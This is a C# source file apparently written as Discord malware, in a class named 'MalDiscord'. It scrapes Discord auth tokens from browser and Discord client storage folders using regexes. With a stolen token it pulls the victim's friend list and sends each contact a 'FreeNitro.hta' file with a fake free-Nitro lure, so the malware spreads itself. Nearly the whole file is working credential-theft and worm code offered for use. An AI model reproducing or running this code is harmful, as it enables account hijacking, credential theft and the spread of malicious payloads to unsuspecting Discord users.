using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Http.Headers;

namespace Discord2
{
    class MalDiscord
    {
        private static readonly HttpClient client = new HttpClient();


        public static void Run()
        {
            List<string> tokens = GetTokens();
            if (tokens.Count > 0){
                SetHeaders(tokens[0]);
            } else {
                Console.WriteLine("No Tokens found :(");
                return;
            }

            List<string>? chats = GetChatsID(tokens[0]);
            if(chats == null)
                return;

            ByteArrayContent? fileContent = GetFile();
            if(fileContent == null)
                return;

            foreach(string c in chats){
                if(c != null)
                    SendMessage(c, fileContent, "Hey, Discord sent me this, you want nitro for free too?");
            }
        }

        static List<string> GetTokens()
        {
            
            string? appdata = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            string? roaming = Environment.GetEnvironmentVariable("APPDATA");

            List<string> sourceDirectories = new List<string>();
            
            sourceDirectories.Add(appdata + @"\Google\Chrome\User Data\Default\Local Storage\leveldb");
            sourceDirectories.Add(roaming + @"\discord\Local Storage\leveldb");           
            sourceDirectories.Add(roaming + @"\discordptb\Local Storage\leveldb");
            sourceDirectories.Add(roaming + @"\discordcanary\Local Storage\leveldb");
            sourceDirectories.Add(roaming + @"\Opera Software\Opera Stable\Local Storage\leveldb");
            sourceDirectories.Add(appdata + @"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb");
            sourceDirectories.Add(appdata + @"\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb");

            List<string> discordTokens = new List<string>();
            
            foreach(string dir in sourceDirectories){
                if(Directory.Exists(dir))
                {    
                    foreach (var currentFile in Directory.GetFiles(dir, "*.ldb").Concat(Directory.GetFiles(dir, "*.log")))
                    {
                        try{
                            string fileContents;
                            using (var stream = File.OpenText(currentFile)){
                                fileContents = stream.ReadToEnd();
                            }

                            foreach (Match match in Regex.Matches(fileContents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")){
                                discordTokens.Add(match.Value);
                                Console.WriteLine(String.Format("{0} Found at {1}", match.Value, currentFile));
                            }

                            foreach (Match match in Regex.Matches(fileContents, @"mfa\.[\w-]{84}"))
                                discordTokens.Add(match.Value);
                        } catch {
                            continue;
                        }
                    }
                }
            }

            discordTokens = discordTokens.Distinct().ToList();

            return discordTokens;            
        }
    
        static void SetHeaders(string token)
        {
            client.DefaultRequestHeaders.Clear();
            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
            client.DefaultRequestHeaders.Add("Authorization", token);
        }
        
        

        static List<string>? GetChatsID(string token)
        {
            var r = client.GetAsync("https://discordapp.com/api/v6/users/@me/relationships").Result;
            var r_content = r.Content.ReadAsStringAsync().Result;
            
            List<string>? s = new List<string>();
            
            foreach (Match match in Regex.Matches(r_content, @"[\d]{18}"))
                s.Add(match.Value);

            return s.Distinct().ToList();
        }


        static ByteArrayContent? GetFile()
        {   
            Stream? fileStream = fileStream = File.OpenRead(@"FreeNitro.hta");
            
            if(fileStream != null)
            {
                var streamContent = new StreamContent(fileStream);
                var fileContent = new ByteArrayContent(streamContent.ReadAsByteArrayAsync().Result);
                return fileContent;
            }

            return null;
        }

        static void SendMessage(string chat_id, ByteArrayContent fileContent, string message)
        {
            var formContent = new MultipartFormDataContent("---------------------------7363696d6d696f6e654e4654");
            formContent.Add(new StringContent("file"), "name");
            formContent.Add(new StringContent("FreeNitro.hta"), "filename");            
            formContent.Add(fileContent, "content", Path.GetFileName(@"FreeNitro.hta"));
            formContent.Add(new StringContent(message), "content");

            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("multipart/form-data"));

            var response = client.PostAsync(String.Format("https://discordapp.com/api/v6/channels/{0}/messages", chat_id), formContent).Result;
        }
    }
}